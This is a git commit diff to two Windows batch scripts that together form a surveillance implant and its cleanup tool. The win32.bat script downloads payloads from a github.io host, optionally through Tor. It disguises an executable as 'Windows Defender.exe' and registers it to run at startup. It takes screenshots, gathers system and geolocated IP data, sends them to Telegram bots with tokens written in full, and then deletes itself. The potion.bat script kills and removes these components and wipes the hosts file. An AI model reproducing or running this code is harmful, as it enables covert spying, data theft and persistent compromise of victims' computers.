475a716b8292ea4d046ad3546a9ca966e95a8b43
cryptedodissey <90626486+cryptedodissey@users.noreply.github.com>
2023-03-27 07:28:39 +0200

    Add files via upload

--- Tools/potion.bat
+++ Tools/potion.bat
@@ -1,42 +1,33 @@
-netsh advfirewall firewall delete rule name="apache" program="C:\Windows\apache2\bin\httpd.exe"
-REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /f
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f  
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f
+set environment=%AppData%\Microsoft\Windows
+netsh advfirewall firewall delete rule name="apache" program="%environment%\apache2\bin\httpd.exe"
 
-attrib -s -h "C:\Windows\System32\drivers\etc\hosts"
-attrib -s -h "C:\Windows\System32\drivers\etc"
 taskkill /f /im tor.exe
 taskkill /f /im "Windows Defender.exe"
-nircmd exec hide "C:\Program Files\RDP Wrapper\uninstall.bat"
-timeout -t 10
 taskkill /f /im expose.exe
 taskkill /f /im httpd.exe
-nircmd execmd del /s /f /q /a "C:\Windows\Windows Defender.exe"
-nircmd execmd del /s /f /q /a "C:\Windows\expose.exe"
-nircmd execmd del /s /f /q /a "C:\Windows\curl.exe"
-nircmd execmd del /s /f /q /a "C:\Windows\tor.exe"
-nircmd execmd rmdir /s /q "%appdata%\Ookla"
-nircmd execmd rmdir /s /q "C:\Windows\Win32"
-nircmd execmd rmdir /s /q "C:\Program Files\RDP Wrapper"
-nircmd execmd rmdir /s /q  "C:\Windows\apache2"
-nircmd execmd rmdir /s /q  "C:\Windows\7-Zip"
-nircmd execmd del /s /f /q /a "C:\Windows\nircmd.exe"
+"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\Windows Defender.exe"
+"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\expose.exe"
+"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\curl.exe"
+"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\tor.exe"
+"%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\Ookla"
+"%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\Win32"
+"%environment%\nircmd.exe" execmd rmdir /s /q "C:\Program Files\RDP Wrapper"
+"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\apache2"
+"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\7-Zip"
+"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\nircmd.exe"
 Taskkill /f /im winrun.exe
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
-del /s /f /q /a "C:\Windows\Win32\*.bat"
+del /s /f /q /a "%environment%\Win32\*.bat"
 taskkill /F /IM wscript.exe
 taskkill /F /IM cscript.exe
-TAKEOWN /F "C:\Windows\System32\drivers\etc" /R /D N
+TAKEOWN /F "%environment%\System32\drivers\etc" /R /D N
 cd \
-cd "C:\Windows\System32\drivers\etc\
+cd "%environment%\System32\drivers\etc\
 del /s /f /q /a "Hosts"
 
-icacls "C:\Windows\System32\drivers\etc" /reset /T /C
-icacls "C:\Windows" /reset /C
+icacls "%environment%\System32\drivers\etc" /reset /T /C
+icacls "%environment%" /reset /C
 taskkill /f /im timeout.exe
 taskkill /f /im explorer.exe
 start "" "%windir%\explorer.exe"  
--- win32.bat
+++ win32.bat
@@ -6,36 +6,37 @@ ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
 
 Set host=https://cryptedodissey.github.io
+Set environment=%AppData%\Microsoft\Windows
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
   set "proxy=--tlsv1"
 )
 
-attrib -s -h -i "C:\Windows\expose.exe" 
-if exist "C:\Windows\expose.exe" (
-    attrib +s +h +i "C:\Windows\expose.exe"
+attrib -s -h -i "%environment%\expose.exe" 
+if exist "%environment%\expose.exe" (
+    attrib +s +h +i "%environment%\expose.exe"
 ) else (
-    curl.exe -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "C:\Windows\7-Zip\7z.exe" x "%temp%\expose.zip" -o"C:\Windows" -y && attrib +s +h +i "C:\Windows\expose.exe" && del "%temp%\expose.zip"
+    "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.zip"
 )
  
-if exist "C:\Windows\apache2\bin\httpd.exe" (
+if exist "%environment%\apache2\bin\httpd.exe" (
     echo.
 ) else (
-    curl.exe -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "C:\Windows\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"C:\Windows" -y && attrib +s +h +i "C:\Windows\apache2" && del "%temp%\apache2.zip"
+    "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.zip"
 )
 
-attrib -s -h -i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
 set "folder=%random%"
 mkdir "%temp%\%folder%" 
 attrib +s +h +i "%temp%\%folder%" 
 cd "%temp%\%folder%"
 rmdir /s /q "%AppData%\Ookla"
-curl.exe -k %proxy% %host%/Capture/speedtest.exe --output "speedtest.exe"
-curl.exe -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
-nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
+"%environment%\curl.exe" -k %proxy% %host%/Capture/speedtest.exe --output "speedtest.exe"
+"%environment%\curl.exe" -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
+"%environment%\nircmd.exe" savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
 "speedtest.exe" | echo YES
 "speedtest.exe" --accept-gdpr >> "%username%@%computername%.txt"
@@ -47,26 +48,26 @@ for /f "tokens=2 delims==" %%G in ('wmic os get OSArchitecture /value') do (
     set OSArchitecture=%%G
     )
 for /f "tokens=*" %%A in (
-  'curl -k ipinfo.io/ip'
+  '"%environment%\curl.exe" -k ipinfo.io/ip'
 ) Do set ExtIP=%%A
 for /f "tokens=*" %%A in (
-  'curl -k ipinfo.io/city'
+  '"%environment%\curl.exe" -k ipinfo.io/city'
 ) Do set City=%%A
 for /f "tokens=*" %%A in (
-  'curl -k ipinfo.io/region'
+  '"%environment%\curl.exe" -k ipinfo.io/region'
 ) Do set Region=%%A
 for /f "tokens=*" %%A in (
-  'curl -k ipinfo.io/country'
+  '"%environment%\curl.exe" -k ipinfo.io/country'
 ) Do set Country=%%A
 for /f "tokens=1* delims=: " %%A in (
-  'curl -k ipinfo.io/org'
+  '"%environment%\curl.exe" -k ipinfo.io/org'
 ) Do set ISP=%%B
 for /f "tokens=1* delims=: " %%A in (
-  'curl -k %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
+  '"%environment%\curl.exe" -k %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
 ) Do set TorStatus=%%B
 if [%TorStatus%]==[true] (
 for /f "tokens=*" %%A in (
-  'curl -k %proxy% ipinfo.io/ip'
+  '"%environment%\curl.exe" -k %proxy% ipinfo.io/ip'
 ) Do set ExtIPTor=%%A
 ) else (
 set "ExtIPTor=N/A"
@@ -78,12 +79,12 @@ if exist "%temp%\expose.txt" (
    set "Expose=N/A"
 )
 
-curl.exe -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] [Web Server: %Expose%] " https://api.telegram.org/bot5477476868:AAFhkFpzY4ZQZm4NkKCUmyjIpYj_KOKF5CY/sendMessage?chat_id=-1001540530403
-for %%# in ("*.png") do curl.exe -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot5491026940:AAE3_nuWEDnViLI_kJEchTNQgHSpxqSlV3k/sendDocument?chat_id=-1001754616308 -k --insecure
-curl.exe -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-1001656341327 -k --insecure
+"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] [Web Server: %Expose%] " https://api.telegram.org/bot5477476868:AAFhkFpzY4ZQZm4NkKCUmyjIpYj_KOKF5CY/sendMessage?chat_id=-1001540530403
+for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot5491026940:AAE3_nuWEDnViLI_kJEchTNQgHSpxqSlV3k/sendDocument?chat_id=-1001754616308 -k --insecure
+"%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-1001656341327 -k --insecure
 
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
-"C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+"%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 del /s /f /q /a "%~f0"
